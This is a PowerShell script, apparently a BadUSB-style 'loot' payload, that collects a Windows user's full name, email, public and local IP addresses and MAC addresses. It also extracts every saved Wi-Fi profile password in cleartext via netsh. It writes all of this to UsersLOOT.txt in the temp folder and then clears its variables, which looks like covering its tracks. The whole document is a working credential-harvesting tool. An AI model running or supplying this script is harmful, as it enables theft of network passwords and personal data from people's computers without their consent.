$FileName = "$env:tmp/UsersLOOT.txt"

#------------------------------------------------------------------------------------------------------------------------------------

function Get-fullName {
    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    } 
    catch {
        Write-Error "No name was detected" 
        return $env:UserName
        -ErrorAction SilentlyContinue
    }
    return $fullName 
}

$fullName = Get-fullName

#------------------------------------------------------------------------------------------------------------------------------------

function Get-email {
    try {
        # Attempt to retrieve email from the user's environment variables (if available)
        $email = $env:EMAILADDRESS

        # If the email is not set in the environment, use an alternative method
        if (-not $email) {
            $email = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).Caption
        }

        # If no email is detected, return a fallback message
        if (-not $email) {
            $email = "No Email Detected"
        }

        return $email
    }
    catch {
        Write-Error "An email was not found" 
        return "No Email Detected"
        -ErrorAction SilentlyContinue
    }        
}

$email = Get-email

#------------------------------------------------------------------------------------------------------------------------------------

try {
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
} 
catch {
    $computerPubIP = "Error getting Public IP"
}

$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String

$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String

#------------------------------------------------------------------------------------------------------------------------------------

# Fetch Wi-Fi profiles
$profiles = netsh wlan show profiles

# Extract profile names
$profileNames = $profiles | Select-String ":(.+)" | ForEach-Object {
    $_.Matches.Groups[1].Value.Trim()
}

# Retrieve profile details and compile the information
$wifiProfiles = $profileNames | ForEach-Object {
    $name = $_
    $profileDetails = netsh wlan show profile name="$name" key=clear
    if ($profileDetails) {
        $passMatch = $profileDetails | Select-String "Key Content\s+:(.+)"
        if ($passMatch) {
            $pass = $passMatch.Matches.Groups[1].Value.Trim()
            [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass }
        }
    }
} | Format-Table -AutoSize | Out-String

#------------------------------------------------------------------------------------------------------------------------------------

$output = @"
Full Name: $fullName

Email: $email

------------------------------------------------------------------------------------------------------------------------------
Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC

------------------------------------------------------------------------------------------------------------------------------
Wi-Fi Profiles:
$wifiProfiles
"@

# Save all gathered information into UsersLOOT.txt
$output > $FileName

# Output the location of the saved file
Write-Output "File saved to: $FileName"

#------------------------------------------------------------------------------------------------------------------------------------

# Clean up any variables or intermediate data
Remove-Variable -Name 'fullName', 'email', 'computerPubIP', 'localIP', 'MAC', 'profiles', 'profileNames', 'profileDetails', 'passMatch', 'wifiProfiles' -ErrorAction SilentlyContinue

# Optionally, you can also clear the content of variables used for storing intermediate data
$profiles = $null
$profileNames = $null
$profileDetails = $null
$passMatch = $null
$wifiProfiles = $null

# Output completion message
Write-Output "Cleanup completed. All intermediate data cleared."
